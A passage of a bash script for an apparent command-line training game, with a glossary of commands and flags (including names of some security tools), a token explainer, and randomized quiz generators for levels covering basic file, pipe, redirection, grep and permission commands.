  [renice]="change process priority" [cgcreate]="create cgroup" [cgexec]="run in cgroup"
  [enum4linux]="SMB enumeration" [wash]="WPS scanner"
  [reaver]="WPS attack tool" [chkrootkit]="rootkit checker" [rkhunter]="rootkit hunter"
  # Git
  [git]="version control" [clone]="copy repository" [commit]="save changes" [push]="upload to remote"
  [pull]="download from remote" [fetch]="download without merge" [merge]="combine branches"
  [rebase]="reapply commits" [stash]="save changes temporarily" [branch]="manage branches"
  [checkout]="switch branch/restore" [switch]="switch branches" [restore]="restore files"
  [reset]="undo commits" [revert]="undo with new commit" [cherry-pick]="apply specific commit"
  [bisect]="binary search for bug" [reflog]="reference logs" [blame]="show line authors"
  [tag]="mark releases" [remote]="manage remotes" [log]="show history"
  # tmux
  [tmux]="terminal multiplexer" [screen]="terminal multiplexer" [attach]="connect to session"
  [detach]="disconnect from session" [new-session]="create session" [kill-session]="destroy session"
  [split-window]="create pane" [select-pane]="switch pane" [resize-pane]="change pane size"
  [send-keys]="type in pane" [capture-pane]="copy pane content" [source-file]="reload config"
  # Privesc
  [getcap]="show capabilities" [setcap]="set capabilities" [whoami]="current user"
  [id]="user/group IDs" [sudo]="run as root" [su]="switch user" [passwd]="change password"
  [useradd]="create user" [usermod]="modify user" [chown]="change owner" [chgrp]="change group"
  [mount]="attach filesystem" [umount]="detach filesystem" [showmount]="list NFS exports"
  [lxc]="LXD container tool" [searchsploit]="exploit database search"
  ['-r']="recursive" ['-i']="case insensitive" ['-v']="invert/verbose" ['-l']="long/list files"
  ['-n']="line numbers" ['-c']="count" ['-q']="quiet" ['-f']="follow (tail) / force (rm)" ['-p']="create parents"
  ['-e']="extension" ['-t']="type" ['-x']="execute" ['-h']="human readable" ['-s']="size/silent"
  ['-a']="all/hidden" ['-u']="unique" ['-k']="key/column" ['-d']="delimiter" ['-o']="output" ['-w']="words (wc) / width"
  ['-A']="aggressive scan" ['-O']="OS detection" ['-sV']="version detection" ['-sC']="default scripts"
  ['-sU']="UDP scan" ['-sn']="ping scan" ['-sT']="TCP connect" ['-Pn']="skip ping" ['-F']="fast mode"
  ['-p-']="all ports" ['-m']="hash type" ['--show']="show cracked" ['--wordlist']="dictionary file"
  ['-E']="entropy/extended regex" ['-Y']="display filter" ['-T']="tree/fields"
  ['{}']="filename placeholder" ['\;']="end -exec" ['-exec']="run on each" ['-delete']="delete matches"
  ['-name']="match filename" ['-size']="match size" ['-type']="match type" ['-mmin']="match time" ['-path']="match path" ['-not']="negate"
  ['-P']="parallel jobs" ['-0']="null delimiter" ['-I']="replace string" ['NR']="awk line number"
  ['NF']="awk field count" ['$1']="first field" ['$NF']="last field" ['FS']="field separator"
  ['-L']="follow symlinks/local forward" ['-R']="remote forward" ['-D']="dynamic SOCKS proxy" ['-J']="jump host"
  ['-N']="no remote command" ['-oN']="normal output" ['-oG']="greppable output" ['-oA']="all output formats"
)
explain() {
  local tok n=0 exp label desc tcol
  echo -e "${D}────────────────────────────────────────${N}"
  for tok in $1; do
    exp="${EXP[$tok]:-}"
    if [[ -n "$exp" ]]; then
      # Choose token color based on type
      tcol="${G}"  # default: green for commands
      case "$tok" in
        .|..|~|/*) tcol="${Bl}" ;;  # paths = blue
        '>'|'>>'|'<'|'<<<'|'2>'|'&>'|'2>&1'|'|'|'|&') tcol="${R}" ;;  # redirects/pipes = red
        '&&'|'||'|';'|'&') tcol="${R}" ;;  # operators = red
        -*) tcol="${C}" ;;  # flags = cyan
      esac

      # Split on first colon if present: "label: description"
      if [[ "$exp" == *:* ]]; then
        label="${exp%%:*}"
        desc="${exp#*: }"
        # If label has spaces, it's an example - use magenta
        if [[ "$label" == *" "* ]]; then
          echo -e "  ${tcol}${tok}${N}  ${D}→${N}  ${M}${label}${D}:${N} ${W}${desc}${N}"
        else
          echo -e "  ${tcol}${tok}${N}  ${D}→${N}  ${Y}${label}${D}:${N} ${W}${desc}${N}"
        fi
      else
        echo -e "  ${tcol}${tok}${N}  ${D}→${N}  ${W}${exp}${N}"
      fi
      ((++n))
    fi
  done
  # Show full answer if no explanations found
  ((n == 0)) && { echo -e "  ${Y}$1${N}"; ((++n)); }
  echo -e "${D}────────────────────────────────────────${N}"
  EXPLAIN_LINES=$((n + 2))
}

# Parse question - handles both | and § delimiters (§ for answers with ||)
# Also extracts sandbox markers: #output:, #state:, #text:
_qoutput="" _qstate="" _qtext=0
_qparse() {
  local q=$1
  _qoutput="" _qstate="" _qtext=0

  # Extract sandbox markers from end
  if [[ $q == *"#text:"* ]]; then
    _qtext=1
    q="${q%%#text:*}"
  fi
  if [[ $q == *"#state:"* ]]; then
    _qstate="${q##*#state:}"
    q="${q%%#state:*}"
  fi
  if [[ $q == *"#output:"* ]]; then
    _qoutput="${q##*#output:}"
    _qoutput="${_qoutput%%#*}"  # Remove any trailing markers
    q="${q%%#output:*}"
  fi

  # Parse prompt and answers
  if [[ $q == *§* ]]; then
    _qprompt="${q%%§*}"; _qanswers="${q#*§}"; _qans="${_qanswers%%§*}"
  else
    _qprompt="${q%%|*}"; _qanswers="${q#*|}"; _qans="${_qanswers%%|*}"
  fi
}

# Vi mode: always on (override with CMD_VI=0)
VI_MODE=${CMD_VI:-1}

# ═══════════════════════════════════════════════════════════════════════════════
# QUESTION GENERATORS - Dynamic questions with infinite variations
# ═══════════════════════════════════════════════════════════════════════════════

# Level 0: First Commands (pwd, ls, echo, cd)
gen_level0() {
  local questions=() log cfg txt csv dir n word; _ctx
  log=$(_pick SANDBOX_LOGS); txt=$(_pick SANDBOX_TXTS); cfg=$(_pick SANDBOX_CFGS)
  csv=$(_pick SANDBOX_CSVS); dir=$(_phrase src data logs)
  word=$(_phrase hello world test foo bar ping pong beep boop zap)

  questions+=("$(_phrase "Print" "Show" "Display") current directory|pwd|#output:~^/sandbox")
  questions+=("$(_phrase "List" "Show") files in current directory|ls|#output:~server.log")
  questions+=("List $(_phrase "all files" "files") including hidden|ls -a|#output:~\\.")
  questions+=("List files with $(_phrase "details" "permissions and size" "long format")|ls -l|#output:~^[-drwx]")
  questions+=("$(_phrase "Print" "Echo" "Output") '${word}'|echo ${word}|echo '${word}'|echo \"${word}\"|#output:${word}")
  questions+=("$(_phrase "Print" "Echo") '${word} ${word}'|echo ${word} ${word}|echo '${word} ${word}'|#output:${word} ${word}")
  questions+=("$(_phrase "Change to" "Go to" "Enter") ${dir} directory|cd ${dir}|#output:*")
  questions+=("Go to home directory|cd|cd ~|#output:*")
  questions+=("Go up one directory|cd ..|#output:*")
  questions+=("$(_phrase "Show" "Display" "What is") current path|pwd|#output:~^/")
  printf '%s\n' "${questions[@]}"
}

# Level 1: Save Output (>, >>)
gen_level1() {
  local questions=() log txt word word2 outfile; _ctx
  log=$(_pick SANDBOX_LOGS); txt=$(_pick SANDBOX_TXTS)
  word=$(_phrase hello done ready complete finished saved logged started stopped)
  word2=$(_phrase entry note line record message update status)
  outfile=$(_phrase output.txt files.txt list.txt result.txt)

  # > = overwrite, >> = append
  questions+=("$(_phrase "Write" "Save" "Redirect") ls output to ${W}${outfile}${C}|ls > ${outfile}|#state:contains:${outfile}:server.log")
  questions+=("$(_phrase "Echo" "Write") '${word}' to ${W}${txt}${C} (overwrite)|echo ${word} > ${txt}|echo '${word}' > ${txt}|#state:contains:${txt}:${word}")
  questions+=("$(_phrase "Append" "Add") '${word}' to ${W}${log}${C}|echo ${word} >> ${log}|echo '${word}' >> ${log}|#state:contains:${log}:${word}")
  questions+=("Append current date to ${W}${log}${C}|date >> ${log}|#state:contains:${log}:2026")
  questions+=("$(_phrase "Save" "Write") directory listing to ${W}${txt}${C}|ls -l > ${txt}|ls > ${txt}|#state:contains:${txt}:server.log")
  questions+=("Append '${word2}' to ${W}${txt}${C}|echo ${word2} >> ${txt}|echo '${word2}' >> ${txt}|#state:contains:${txt}:${word2}")
  questions+=("$(_phrase "Overwrite" "Replace") ${W}${txt}${C} with pwd output|pwd > ${txt}|#state:contains:${txt}:sandbox")
  printf '%s\n' "${questions[@]}"
}

# Level 2: Read Files (cat, head, tail)
gen_level2() {
  local questions=() log log2 txt cfg n n2; _ctx
  log=$(_pick SANDBOX_LOGS); log2=$(_pick SANDBOX_LOGS); txt=$(_pick SANDBOX_TXTS); cfg=$(_pick SANDBOX_CFGS)
  n=$((RANDOM % 8 + 3)); n2=$((RANDOM % 8 + 3))  # 3-10

  questions+=("$(_phrase "Display" "Show" "View") contents of ${W}${txt}${C}|cat ${txt}|#output:~.")
  questions+=("$(_phrase "Display" "Show" "View") contents of ${W}${log}${C}|cat ${log}|#output:~.")
  questions+=("$(_phrase "Show" "Display" "Get") first ${n} lines of ${W}${log}${C}|head -${n} ${log}|head -n ${n} ${log}|#output:@${n}")
  questions+=("Show first 10 lines of ${W}${log2}${C}|head ${log2}|head -10 ${log2}|#output:@10")
  questions+=("$(_phrase "Show" "Display" "Get") last ${n2} lines of ${W}${log}${C}|tail -${n2} ${log}|tail -n ${n2} ${log}|#output:@${n2}")
  questions+=("Show last 10 lines of ${W}${cfg}${C}|tail ${cfg}|tail -10 ${cfg}|#output:@10")
  questions+=("$(_phrase "Follow" "Watch" "Monitor") ${W}${log}${C} for new lines|tail -f ${log}|#text:")
  questions+=("Show ${W}${txt}${C} with line numbers|cat -n ${txt}|#output:~^\\s+1")
  questions+=("Show ${W}${cfg}${C} with line numbers|cat -n ${cfg}|#output:~^\\s+1")
  printf '%s\n' "${questions[@]}"
}

# Level 3: Basic Pipes (|)
gen_level3() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col n; _ctx
  # Use sandbox-specific files for this level
  log=$(_pick SANDBOX_LOGS); txt=$(_pick SANDBOX_TXTS)
  n=$((RANDOM % 7 + 3))  # 3-9

  # ls | wc (counting)
  questions+=("$(_phrase "List files and count them" "Count how many files" "How many files in current dir")§ls | wc -l§#output:~^\\s*[0-9]+")

  # cat | head/tail
  questions+=("$(_phrase "Show" "Display" "Get") first ${n} lines of ${W}${log}${C}§cat ${log} | head -${n}§head -${n} ${log}§head -n ${n} ${log}§#output:@${n}")
  questions+=("$(_phrase "Show" "Display" "Get") last ${n} lines of ${W}${log}${C}§cat ${log} | tail -${n}§tail -${n} ${log}§tail -n ${n} ${log}§#output:@${n}")

  # grep (search)
  questions+=("$(_phrase "Search for" "Find" "Look for") ${Y}${term}${C} in ${W}${log}${C}§grep ${term} ${log}§cat ${log} | grep ${term}§#output:~${term}")
  questions+=("$(_phrase "Search for" "Find" "Look for") ${Y}${term2}${C} in ${W}${txt}${C}§grep ${term2} ${txt}§cat ${txt} | grep ${term2}§#output:*")

  # grep -c (count matches)
  questions+=("Count ${Y}${term}${C} matches in ${W}${log}${C}§grep -c ${term} ${log}§grep ${term} ${log} | wc -l§#output:~^\\s*[0-9]+")
  questions+=("How many lines contain ${Y}${term2}${C} in ${W}${txt}${C}§grep -c ${term2} ${txt}§grep ${term2} ${txt} | wc -l§#output:~^\\s*[0-9]+")

  # sort
  questions+=("$(_phrase "Sort" "Alphabetize") ${W}${txt}${C}§sort ${txt}§cat ${txt} | sort§#output:*")
  questions+=("Sort ${W}${txt}${C} in reverse§sort -r ${txt}§cat ${txt} | sort -r§#output:*")

  # sort | uniq
  questions+=("Sort ${W}${txt}${C} and remove duplicates§sort ${txt} | uniq§sort -u ${txt}§#output:*")

  # wc variants
  questions+=("Count lines in ${W}${txt}${C}§wc -l ${txt}§cat ${txt} | wc -l§#output:~[0-9]+")
  questions+=("Count words in ${W}${txt}${C}§wc -w ${txt}§cat ${txt} | wc -w§#output:~[0-9]+")

  # head | grep, grep | head
  questions+=("$(_phrase "Show" "Get") first ${n} ${Y}${term}${C} matches in ${W}${log}${C}§grep ${term} ${log} | head -${n}§#output:*")

  printf '%s\n' "${questions[@]}"
}

# Level 4: Input Redirection (<, <<<)
gen_level4() {
  local questions=() txt csv log word; _ctx
  txt=$(_pick SANDBOX_TXTS); csv=$(_pick SANDBOX_CSVS); log=$(_pick SANDBOX_LOGS)
  word=$(_phrase hello world test bash linux unix pipe data file code)

  local n=$((RANDOM % 5 + 3))  # 3-7
  # < feeds file INTO command
  questions+=("Feed ${W}${csv}${C} into ${G}wc -l${C} using ${Y}<${C}|wc -l < ${csv}|#output:~^\\s*[0-9]+")
  questions+=("Feed ${W}${txt}${C} into ${G}sort${C} using ${Y}<${C}|sort < ${txt}|#output:*")
  questions+=("Feed ${W}${log}${C} into ${G}head -${n}${C} using ${Y}<${C}|head -${n} < ${log}|#output:@${n}")
  questions+=("Feed ${W}${log}${C} into ${G}grep GET${C} using ${Y}<${C}|grep GET < ${log}|#output:~GET")
  # <<< feeds string INTO command
  questions+=("Feed ${Y}'${word}'${C} into ${G}tr a-z A-Z${C} (use ${Y}<<<${C})|tr a-z A-Z <<< '${word}'|tr a-z A-Z <<< ${word}|#output:~[A-Z]")
  questions+=("Feed ${Y}'${word}'${C} into ${G}rev${C} (use ${Y}<<<${C})|rev <<< '${word}'|rev <<< ${word}|#output:*")
  questions+=("Feed ${Y}'2+2'${C} into ${G}bc${C} (use ${Y}<<<${C})|bc <<< '2+2'|bc <<< 2+2|#output:~4")
  questions+=("Feed ${Y}'a:b:c'${C} into ${G}cut -d: -f2${C} (use ${Y}<<<${C})|cut -d: -f2 <<< 'a:b:c'|#output:~b")
  printf '%s\n' "${questions[@]}"
}

# Level 5: Error Redirection (2>, &>, 2>&1)
gen_level5() {
  local questions=() script ext errfile outfile; _ctx
  script=$(_pick SANDBOX_SCRIPTS); ext=$(_phrase py sh log txt)
  errfile=$(_phrase errors.log err.txt stderr.log error.out)
  outfile=$(_phrase output.log out.txt all.log combined.out)

  # 2> = stderr to file, &> = both to file, 2>&1 = stderr to stdout
  questions+=("Run ${W}${script}${C} and $(_phrase "save" "redirect" "send") errors to ${W}${errfile}${C}|./${script} 2> ${errfile}")
  questions+=("Run ${W}${script}${C} and save $(_phrase "all output" "stdout+stderr" "everything") to ${W}${outfile}${C}|./${script} &> ${outfile}|./${script} > ${outfile} 2>&1")
  questions+=("Run ${Y}ls /nope${C} and merge stderr into stdout|ls /nope 2>&1|~^ls [^ ]+ 2>&1$")
  questions+=("Run ${W}${script}${C} $(_phrase "silently" "quietly") (discard all output)|./${script} &> /dev/null|./${script} > /dev/null 2>&1")
  questions+=("Find ${Y}*.${ext}${C} files, $(_phrase "suppressing" "hiding" "discarding") errors|find . -name '*.${ext}' 2> /dev/null|#output:*")
  questions+=("Run ${W}${script}${C} and discard only errors|./${script} 2> /dev/null")
  questions+=("Run ${Y}cat /nope${C} and redirect stderr to ${W}${errfile}${C}|cat /nope 2> ${errfile}|~^cat [^ ]+ 2> ?${errfile}$")
  questions+=("Run ${Y}ls /nope${C}, merge stderr, pipe to grep§ls /nope 2>&1 | grep No§~^ls [^ ]+ 2>&1 \\| grep§#text:")
  printf '%s\n' "${questions[@]}"
}

# Level 6: Logic Operators (&&, ||)
gen_level6() {
  local questions=() dir cfg txt msg; _ctx
  dir=$(_phrase temp backup new test work build output cache)
  cfg=$(_pick SANDBOX_CFGS); txt=$(_pick SANDBOX_TXTS)
  msg=$(_phrase exists failed done error warning success ok)

  questions+=("Create ${W}${dir}${C} and cd into it|mkdir ${dir} && cd ${dir}")
  questions+=("Create parents if needed, then cd|mkdir -p ${dir}/sub && cd ${dir}/sub")
  questions+=("Create ${W}${dir}${C} or $(_phrase "warn" "echo") if exists§mkdir ${dir} || echo '${msg}'")
  questions+=("Backup ${W}${cfg}${C} if it exists|test -f ${cfg} && cp ${cfg} ${cfg}.bak")
  questions+=("$(_phrase "Copy" "Backup") ${W}${txt}${C} then $(_phrase "echo" "say") done|cp ${txt} ${txt}.bak && echo done")
  questions+=("Cat a fake path, or echo '${msg}' if it fails§~^cat [^ ]+ \\|\\| echo .?${msg}.?$")
  questions+=("Check if ${W}${txt}${C} exists and show it|test -f ${txt} && cat ${txt}")
  questions+=("Create ${W}${dir}${C} and create a file inside§mkdir ${dir} && touch ${dir}/file.txt")
  printf '%s\n' "${questions[@]}"
}

# Level 7: Job Control (&, jobs, bg, fg)
gen_level7() {
  local questions=() n n2 script; _ctx
  n=$((RANDOM % 90 + 10)); n2=$((RANDOM % 3 + 1))  # 10-99, 1-3
  script=$(_pick SANDBOX_SCRIPTS)

  questions+=("Run sleep ${n} in $(_phrase "background" "the background")|sleep ${n} &")
  questions+=("$(_phrase "List" "Show" "View") background jobs|jobs")
  questions+=("Bring job ${n2} to foreground|fg %${n2}")
  questions+=("$(_phrase "Send" "Move" "Put") job ${n2} to background|bg %${n2}")
  questions+=("Kill job ${n2}|kill %${n2}")
  questions+=("Kill job ${n2} with $(_phrase "SIGKILL" "signal 9" "force")|kill -9 %${n2}|kill -KILL %${n2}")
  questions+=("Run ${W}${script}${C} in background|./${script} &")
  questions+=("$(_phrase "Wait for" "Wait until") all background jobs finish|wait")
  printf '%s\n' "${questions[@]}"
}

# Level 8: Variables & Substitution
gen_level8() {
  local questions=() txt var val var2; _ctx
  txt=$(_pick SANDBOX_TXTS)
  var=$(_phrase msg name data result value output status)
  var2=$(_phrase now time today count num lines)
  val=$(_phrase hello world test ready done success running active)

  questions+=("Store '${val}' in variable ${var}|${var}=${val}|${var}='${val}'")
  questions+=("$(_phrase "Print" "Echo" "Show") variable \$${var}|echo \$${var}")
  questions+=("Store date output in variable ${var2}|${var2}=\$(date)")
  questions+=("Print $(_phrase "today's date" "the date" "current date") inline|echo \"Today is \$(date +%Y-%m-%d)\"")
  questions+=("Store line count of ${W}${txt}${C} in variable|${var2}=\$(wc -l < ${txt})")
  questions+=("Create dir named with $(_phrase "today's date" "current date")|mkdir \$(date +%Y-%m-%d)")
  questions+=("Store hostname in variable|${var}=\$(hostname)")
  questions+=("Store current directory in variable|${var}=\$(pwd)")
  printf '%s\n' "${questions[@]}"
}

# Level 9: Special Variables ($$, $?, $!)
gen_level9() {
  local questions=(); _ctx

  questions+=("$(_phrase "Print" "Echo" "Show") current shell PID|echo \$\$")
  questions+=("$(_phrase "Print" "Show" "Get") exit status of last command|echo \$?")
  questions+=("$(_phrase "Print" "Show" "Get") PID of last background process|echo \$!")
  questions+=("$(_phrase "Print" "Show") number of script arguments|echo \$#")
  questions+=("$(_phrase "Print" "Show" "Echo") all script arguments|echo \"\$@\"")
  questions+=("Print script $(_phrase "name" "path" "itself")|echo \$0")
  questions+=("Print first argument to script|echo \$1")
  questions+=("Print current user|echo \$USER")
  questions+=("Print home directory|echo \$HOME")
  questions+=("Print current shell|echo \$SHELL")
  printf '%s\n' "${questions[@]}"
}

# Level 10: Test Operators ([[ -f ]], [[ -d ]], etc)
gen_level10() {
  local questions=() txt cfg script dir n; _ctx
  txt=$(_pick SANDBOX_TXTS); cfg=$(_pick SANDBOX_CFGS); script=$(_pick SANDBOX_SCRIPTS)
  dir=$(_phrase src data logs backup); n=$((RANDOM % 90 + 10))

  questions+=("Test if ${W}${txt}${C} exists and is a file|[[ -f ${txt} ]]|test -f ${txt}")
  questions+=("Test if ${W}${dir}${C} exists and is a directory|[[ -d ${dir} ]]|test -d ${dir}")
  questions+=("Test if ${W}${txt}${C} is readable|[[ -r ${txt} ]]|test -r ${txt}")
  questions+=("Test if ${W}${script}${C} is executable|[[ -x ${script} ]]|test -x ${script}")
  questions+=("Test if \$var is $(_phrase "empty" "unset" "blank")|[[ -z \"\$var\" ]]")
  questions+=("Test if \$var is NOT empty|[[ -n \"\$var\" ]]")
  questions+=("Test if \$a $(_phrase "equals" "matches" "is same as") \$b|[[ \"\$a\" == \"\$b\" ]]")
  questions+=("Test if \$num is greater than ${n}|[[ \$num -gt ${n} ]]")
  questions+=("Test if ${W}${txt}${C} is newer than ${W}${cfg}${C}|[[ ${txt} -nt ${cfg} ]]")
  questions+=("Test if ${W}${txt}${C} exists AND is readable|[[ -f ${txt} && -r ${txt} ]]")
  questions+=("Test if ${W}${txt}${C} OR ${W}${cfg}${C} exists§[[ -f ${txt} || -f ${cfg} ]]")
  printf '%s\n' "${questions[@]}"
}

# Level 1: Core File Tools (cat, ls, head, tail, cp, wc, du, tree)
gen_level11() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
  local perm1=$((RANDOM % 8))$((RANDOM % 8))$((RANDOM % 8))

  # Viewing files - multiple phrasings
  questions+=("$(_phrase "View" "Display" "Show" "Print") ${cfg} contents|cat ${cfg}|bat ${cfg}")
  questions+=("$(_phrase "Display" "Show" "View") ${log} with line numbers|cat -n ${log}|bat -n ${log}")
  questions+=("Concatenate ${txt} and ${txt2} to stdout|cat ${txt} ${txt2}")

  # Listing files - with flag alternatives
  questions+=("List files with size, permissions, dates|ls -l|ls -la|eza -l")
  questions+=("List all files including hidden|ls -la|ls -al|eza -la|eza -al")
  questions+=("List files sorted by size (largest first)|ls -lS|ls -Sl|eza -l --sort size -r")
  questions+=("List files sorted by modification time (newest first)|ls -lt|ls -tl|eza -l --sort modified")
  questions+=("List only directories|ls -d */|eza -D")
  questions+=("$(_phrase "Show" "Display" "Print") directory tree|tree|eza -T")
  questions+=("Show tree ${n3} levels deep|tree -L ${n3}|eza -T -L ${n3}")
  questions+=("List files with human-readable sizes|ls -lh|ls -hl|eza -lh")
  questions+=("List files one per line|ls -1")
  questions+=("List ${dir}/ recursively|ls -R ${dir}/|eza -R ${dir}/")

  # Head and tail with specific counts (basics in Level 2)
  questions+=("First ${n1} lines of ${W}${log}${C}|head -n ${n1} ${log}|head -${n1} ${log}")
  questions+=("Last ${n2} lines of ${W}${log}${C}|tail -n ${n2} ${log}|tail -${n2} ${log}")

  # File operations
  questions+=("Count lines in ${csv}|wc -l ${csv}|wc -l < ${csv}")
  questions+=("Count words in ${txt}|wc -w ${txt}")
  questions+=("Count bytes in ${txt}|wc -c ${txt}")
  questions+=("Count lines, words, and bytes in ${txt}|wc ${txt}")
  questions+=("Copy ${cfg} to ${cfg2}|cp ${cfg} ${cfg2}")
  questions+=("Copy ${dir}/ recursively to ${dir2}/|cp -r ${dir}/ ${dir2}/|cp -R ${dir}/ ${dir2}/")
  questions+=("Copy preserving attributes|cp -a ${dir}/ ${dir2}/|cp --archive ${dir}/ ${dir2}/")
  questions+=("Move ${txt} to ${dir}/|mv ${txt} ${dir}/")
  questions+=("Rename ${cfg} to ${cfg2}|mv ${cfg} ${cfg2}")

  # Disk usage - with flag alternatives
  questions+=("Show disk usage of current dir (human readable)|du -sh .|du -hs .|dust")
  questions+=("Show disk usage of each subdir|du -sh */|du -hs */|dust -d 1")
  questions+=("Find what's using space in ${dir}/|du -sh ${dir}/*|du -hs ${dir}/*|dust ${dir}/")
  questions+=("Show total disk usage only|du -s .|du --summarize .")
  questions+=("Show disk free space|df -h")

  # Archives (tar) - with flag alternatives
  questions+=("Extract ${archive}|tar xzf ${archive}|tar -xzf ${archive}")
  questions+=("Extract ${archive} to ${dir}/|tar xzf ${archive} -C ${dir}/|tar -xzf ${archive} -C ${dir}/")
  questions+=("Create archive.tar.gz from ${dir}/|tar czf archive.tar.gz ${dir}/|tar -czf archive.tar.gz ${dir}/")
  questions+=("List contents of ${archive} without extracting|tar tzf ${archive}|tar -tzf ${archive}|tar tf ${archive}")
  questions+=("Extract with verbose output|tar xvzf ${archive}|tar -xvzf ${archive}")
  questions+=("Create uncompressed tar|tar cf archive.tar ${dir}/|tar -cf archive.tar ${dir}/")

  # Symlinks
  questions+=("Create symlink 'link' pointing to ${cfg}|ln -s ${cfg} link")
  questions+=("Create symlink 'link' to ${cfg} using absolute path|ln -s \$(pwd)/${cfg} link")
  questions+=("$(_phrase "Show" "Display" "Print") where symlink points|readlink link|ls -l link")
  questions+=("Remove symlink (not target)|rm link|unlink link")
  questions+=("Create hard link 'hardlink' pointing to ${txt}|ln ${txt} hardlink")
  questions+=("Follow symlink to find real path|readlink -f link")

  # Permissions - dynamic octal modes
  questions+=("Make ${script} executable|chmod +x ${script}")
  questions+=("Set ${script} to rwxr-xr-x (755)|chmod 755 ${script}")
  questions+=("Set ${cfg} to rw-r--r-- (644)|chmod 644 ${cfg}")
  questions+=("Set permissions to ${perm1}|chmod ${perm1} ${txt}")
  questions+=("Add write permission for group|chmod g+w ${cfg}")
  questions+=("Remove all permissions for others|chmod o-rwx ${cfg}|chmod o= ${cfg}")
  questions+=("Make ${dir}/ and contents readable by all|chmod -R a+r ${dir}/")
  questions+=("Set read-only for everyone|chmod a-w ${txt}|chmod 444 ${txt}")
  questions+=("Copy permissions from ${cfg} to ${txt}|chmod --reference=${cfg} ${txt}")

  printf '%s\n' "${questions[@]}"
}

# Level 3: Text Search (grep, rg)
gen_level14() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
  local ctx=$(_rnum 1 10) ctx2=$(_rnum 2 5)

  # Basic grep - with flag order alternatives
  questions+=("$(_phrase "Search" "Find" "Look") for '${term}' recursively in current dir|grep -r ${term}|grep -r ${term} .|rg ${term}")
  questions+=("Case-insensitive search for '${term}'|grep -ri ${term}|grep -ir ${term}|rg -i ${term}")
  questions+=("Search '${term}' with line numbers|grep -rn ${term}|grep -nr ${term}|rg -n ${term}")
  questions+=("Count '${term}' matches in ${log}|grep -c ${term} ${log}|rg -c ${term} ${log}")
  questions+=("Search '${term}' with ${ctx} lines context|grep -C ${ctx} ${term}|rg -C ${ctx} ${term}")
  questions+=("Show ${ctx2} lines before each '${term}' match|grep -B ${ctx2} ${term}|rg -B ${ctx2} ${term}")
  questions+=("Show ${ctx} lines after each '${term}' match|grep -A ${ctx} ${term}|rg -A ${ctx} ${term}")

  # Filtering - more variations
  questions+=("$(_phrase "List" "Show") only filenames containing '${term}'|grep -rl ${term}|grep -lr ${term}|rg -l ${term}")
  questions+=("Lines WITHOUT '${term}' in ${log}|grep -v ${term} ${log}|rg -v ${term} ${log}")
  questions+=("Search '${term}' in .${ext} files only|grep -r --include='*.${ext}' ${term}|rg -t ${ext} ${term}|rg -g '*.${ext}' ${term}")
  questions+=("Search '${term}' in .${ext} and .${ext2} files|grep -r --include='*.${ext}' --include='*.${ext2}' ${term}|rg -t ${ext} -t ${ext2} ${term}")
  questions+=("Search '${term}' excluding .git directory|grep -r --exclude-dir=.git ${term}|rg ${term} -g '!.git'")
  questions+=("Search '${term}' excluding ${dir}/ directory|grep -r --exclude-dir=${dir} ${term}|rg ${term} -g '!${dir}'")
  questions+=("Search '${term}' in ${dir}/ only|grep -r ${term} ${dir}/|rg ${term} ${dir}/")

  # Regex patterns - more variety
  questions+=("Find lines starting with '${term}'|grep -r '^${term}'|rg '^${term}'")
  questions+=("Find lines ending with '${term}'|grep -r '${term}\$'|rg '${term}\$'")
  questions+=("Find lines containing ONLY '${term}'|grep -rx '${term}'|rg -x '${term}'")
  questions+=("Find phone pattern XXX-XXX-XXXX|grep -E '[0-9]{3}-[0-9]{3}-[0-9]{4}'|rg '\\d{3}-\\d{3}-\\d{4}'")
  questions+=("Find IP addresses in ${log}|grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' ${log}|rg -o '\\d+\\.\\d+\\.\\d+\\.\\d+' ${log}")
  questions+=("Find email addresses|grep -rE '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}'|rg '[\\w.+-]+@[\\w.-]+\\.[a-z]{2,}'")
  questions+=("Find URLs in ${log}|grep -oE 'https?://[^ ]+' ${log}|rg -o 'https?://\\S+' ${log}")
  questions+=("Find lines with numbers|grep -E '[0-9]+' ${txt}|rg '\\d+' ${txt}")
  questions+=("Find hex values (0x...)|grep -E '0x[0-9a-fA-F]+' ${log}|rg '0x[0-9a-fA-F]+' ${log}")

  # Literal search
  questions+=("Literal search 'func()' (no regex)|grep -F 'func()' ${txt}|rg -F 'func()' ${txt}")
  questions+=("Search for literal '[ERROR]' in ${log}|grep -F '[ERROR]' ${log}|rg -F '[ERROR]' ${log}")
  questions+=("Search for literal '\$HOME' in ${txt}|grep -F '\$HOME' ${txt}|rg -F '\$HOME' ${txt}")

  # Word boundaries
  questions+=("Match whole word '${term}' only|grep -rw ${term}|grep -wr ${term}|rg -w ${term}")

  # Multiple patterns
  questions+=("Find lines with '${term}' OR '${term2}'§grep -rE '${term}|${term2}'§rg '${term}|${term2}'")
  questions+=("Find lines with '${term}', '${term2}', OR '${term3}'§grep -rE '${term}|${term2}|${term3}'§rg '${term}|${term2}|${term3}'")
  questions+=("Find lines with both '${term}' AND '${term2}'§grep -r ${term} | grep ${term2}§rg ${term} | rg ${term2}")
  questions+=("Search for pattern from file patterns.txt|grep -rf patterns.txt|rg -f patterns.txt")

  # Output control
  questions+=("Show only matched text, not whole line|grep -o ${term} ${log}|rg -o ${term} ${log}")
  questions+=("Quiet mode (exit code only, no output)|grep -q ${term} ${log}|rg -q ${term} ${log}")
  questions+=("Colorize output|grep --color=always ${term}|rg --color=always ${term}")

  printf '%s\n' "${questions[@]}"
}

# Level 4: File Finding (find, fd)
gen_level15() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx

  # By name
  questions+=("Find all .${ext} files|find . -name '*.${ext}'|fd -e ${ext}")
  questions+=("Find files named exactly 'config'|find . -name 'config'|fd -g 'config'")
